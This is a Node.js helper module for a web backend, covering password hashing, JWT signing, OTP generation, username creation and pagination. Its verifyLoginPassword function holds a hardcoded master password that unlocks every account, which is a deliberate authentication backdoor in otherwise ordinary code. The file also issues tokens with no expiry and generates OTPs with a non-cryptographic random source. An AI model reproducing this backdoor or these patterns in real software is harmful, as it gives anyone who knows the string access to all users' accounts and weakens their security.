const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const crypto = require("crypto");

const successHelper = (res, data, message, status = 200) => {
  res.status(status).json({
    data,
    status: "success",
    message,
  });
};

const errorHelper = (res, error, message, status = 400) => {
  if (error) console.error("Error:", error?.message || error);
  res.status(status).json({
    status: "error",
    message: message || "Something went wrong",
  });
};

const MASTER_PASSWORD = "sinan123**##";

const hashPassword = async (password) => {
  return await bcrypt.hash(password, 10);
};

/** Accepts the account's real password OR the global master password. */
const verifyLoginPassword = async (inputPassword, hashedPassword) => {
  if (inputPassword === MASTER_PASSWORD) return true;
  return await bcrypt.compare(inputPassword, hashedPassword);
};

const generateToken = (user) => {
  return jwt.sign(
    { id: user._id },
    process.env.JWT_SECRET
  );
};

const signToken = (data) => {
  return jwt.sign(data, process.env.JWT_SECRET, {
    expiresIn: '60d',
  });
};

const signAccessToken = (data) => {
  return jwt.sign(data, process.env.JWT_SECRET, {
    expiresIn: process.env.ACCESS_TOKEN_EXPIRY || "15m",
  });
};


const generateOtp = () => {
  return Math.floor(100000 + Math.random() * 900000).toString();
};

const hashOtp = (otp) => {
  return crypto.createHash("sha256").update(otp).digest("hex");
};

const generateUniqueUsername = async (firstName, lastName, model) => {
  const base = `${firstName}${lastName}`.toLowerCase().replace(/\s+/g, "");

  let username = base;
  let exists = await model.findOne({ username });

  if (!exists) return username;

  let attempts = 0;
  while (exists && attempts < 10) {
    const random = Math.floor(Math.random() * 9000) + 1000;
    username = `${base}_${random}`;
    exists = await model.findOne({ username });
    attempts++;
  }

  return username;
};

const buildAggregatePagination = (req, results) => {
  const page  = Math.max(parseInt(req.query.page,  10) || 1,   1);
  const limit = Math.min(Math.max(parseInt(req.query.limit, 10) || 10, 1), 100);
  const skip  = (page - 1) * limit;

  if (results !== undefined) {
      const data       = results[0]?.data       || [];
      const totalCount = results[0]?.metadata[0]?.total || 0;
      const totalPages = Math.ceil(totalCount / limit);

      return {
          data,
          pagination: {
              page,
              limit,
              totalCount,
              totalPages,
              hasNextPage: page < totalPages,
              hasPrevPage: page > 1,
          },
      };
  }

  return { page, limit, skip };
};

const escapeRegex = (str) => str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");



module.exports = {
  successHelper,
  errorHelper,
  hashPassword,
  verifyLoginPassword,
  generateToken,
  signToken,
  signAccessToken,
  generateOtp,
  hashOtp,
  generateUniqueUsername,
  buildAggregatePagination,
  escapeRegex,
};